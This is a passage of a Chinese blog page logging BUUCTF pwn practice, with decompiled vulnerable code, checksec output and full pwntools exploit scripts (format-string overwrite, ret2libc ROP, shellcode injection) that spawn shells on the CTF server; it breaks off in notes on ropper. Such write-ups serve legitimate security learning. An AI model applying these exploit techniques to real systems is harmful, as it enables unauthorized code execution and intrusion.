<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>buu做题记录 | S1nec-1o's B1og</title><meta name="author" content="s1nec-1o"><meta name="copyright" content="s1nec-1o"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="buu做题记录1算是最近得做题记录了，就是一开始的比较简单呃就挺简洁的，所以后面跳到5，6页了，算是总结吧，之后也不知道要干什么，就这样子吧 [第五空间2019 决赛]PWN5静态分析  可以看到有格式字符串漏洞，原本因为1想的是password会在栈上出现，但是并没有应该是被覆盖掉了，因此我们想到直接修改password   123456789from pwn import*#sh&#x3D;proces">
<meta property="og:type" content="article">
<meta property="og:title" content="buu做题记录">
<meta property="og:url" content="http://s1nec-1o.github.io/2024/03/11/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="S1nec-1o&#39;s B1og">
<meta property="og:description" content="buu做题记录1算是最近得做题记录了，就是一开始的比较简单呃就挺简洁的，所以后面跳到5，6页了，算是总结吧，之后也不知道要干什么，就这样子吧 [第五空间2019 决赛]PWN5静态分析  可以看到有格式字符串漏洞，原本因为1想的是password会在栈上出现，但是并没有应该是被覆盖掉了，因此我们想到直接修改password   123456789from pwn import*#sh&#x3D;proces">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png">
<meta property="article:published_time" content="2024-03-11T15:00:19.000Z">
<meta property="article:modified_time" content="2024-04-28T14:12:11.115Z">
<meta property="article:author" content="s1nec-1o">
<meta property="article:tag" content="traditional pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281712481.jpg"><link rel="canonical" href="http://s1nec-1o.github.io/2024/03/11/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"距离文章发布已经过去","messageNext":"天了，信息可能已经过时"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'buu做题记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-28 22:12:11'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 8 || hour >= 20
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="S1nec-1o's B1og" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><nav id="nav"><span id="blog-info"><a href="/" title="S1nec-1o's B1og"><span class="site-name">S1nec-1o's B1og</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">buu做题记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-11T15:00:19.000Z" title="发表于 2024-03-11 23:00:19">2024-03-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-28T14:12:11.115Z" title="更新于 2024-04-28 22:12:11">2024-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">做题记录</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="buu做题记录1"><a href="#buu做题记录1" class="headerlink" title="buu做题记录1"></a>buu做题记录1</h1><p>算是最近得做题记录了，就是一开始的比较简单呃就挺简洁的，所以后面跳到5，6页了，算是总结吧，之后也不知道要干什么，就这样子吧</p>
<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211039.png" alt="image-20240303211815707" style="zoom:50%;" />

<p>可以看到有格式字符串漏洞，原本因为1想的是password会在栈上出现，但是并没有应该是被覆盖掉了，因此我们想到直接修改password</p>
<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211040.png" alt="image-20240303211726790" style="zoom:50%;" />

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn5&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27277</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">pal=p32(<span class="number">0x804C044</span>)+p32(<span class="number">0x804C045</span>)+p32(<span class="number">0x804C046</span>)+p32(<span class="number">0x804C047</span>)+<span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf-2019-babyheap"></a>rctf-2019-babyheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )                      <span class="comment">// &#x27;\0&#x27;绕过</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br></pre></td></tr></table></figure>

<p>本题主要是栈溢出，然后有个加密要绕过，因此先传入’\0’绕过strlen</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">poprid_ret=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">overflow(p64(poprid_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Ciphertext\n\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">overflow(p64(ret)+p64(p64(poprid_ret)+p64(binsh_addr)+p64(system_addr)))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>但是不知道为什么我的libcsearcher一直用不了，所以用网上找的偏移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29738</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">padding=b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x57</span></span><br><span class="line">sh.sendline(padding+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>Ciphertext\n\n<span class="number">&#x27;</span>)   </span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">libc_base=puts_addr<span class="number">-0x0809c0</span></span><br><span class="line">system=libc_base+<span class="number">0x04f440</span></span><br><span class="line">binsh=libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(padding+p64(rdi_addr)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX unknown - GNU_STACK missing</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">Stack:    Executable</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>text在栈上，栈溢出</p>
<p>但是呢第一想法是构造ROP链，但是在ROPgadget的时候发现几乎没有适合的rop，所以只能换个想法了</p>
<p>发现name可写，又有rwx，因此就直接写shellcode，之后ret就行了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">binary=<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span></span><br><span class="line"><span class="meta">#sh=process(binary)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29953</span>)</span><br><span class="line">elf=ELF(binary)</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x0000601080</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)  </span><br><span class="line">shellcode=<span class="keyword">asm</span>(shellcraft.sh()) </span><br><span class="line"></span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>tell me your name\n<span class="number">&#x27;</span>)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>What <span class="keyword">do</span> you want to say to me?<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">pal=0x28*b&#x27;</span>a<span class="number">&#x27;</span>+p64(ret)</span><br><span class="line">sh.send(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这道题学到了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line">shellcode=<span class="keyword">asm</span>(shellcraft.sh()) </span><br></pre></td></tr></table></figure>

<p>首先导入pwntool模块，之后便可以有自助shellcode，虽然我之前都是手写的但是容易挂</p>
<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure>

<p>同<code>ciscn_2019_c_1</code></p>
<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/shared/ctf-learn/3dsctf_2016&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bamboo@bamboo-virtual-machine:/mnt/hgfs/shared/ctf-learn$ ROPgadget --binary <span class="number">3</span>dsctf_2016 --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x0806d8a5</span> : <span class="type">int</span> <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>发现ROPgadget有些东西找不出来这时候就要使用ropper函数</p>
<h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><p>Roopper 的语法基本上由命令和选项组成。下面是一些常用的 Roopper 命令和选项的示例：</p>
<ol>
<li><p>分析二进制文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>搜索特定指令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --search &lt;instruction&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据模式匹配搜索：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --search &lt;pattern&gt; --pattern</span><br></pre></td></tr></table></figure>
</li>
<li><p>过滤和排序指令：</p>
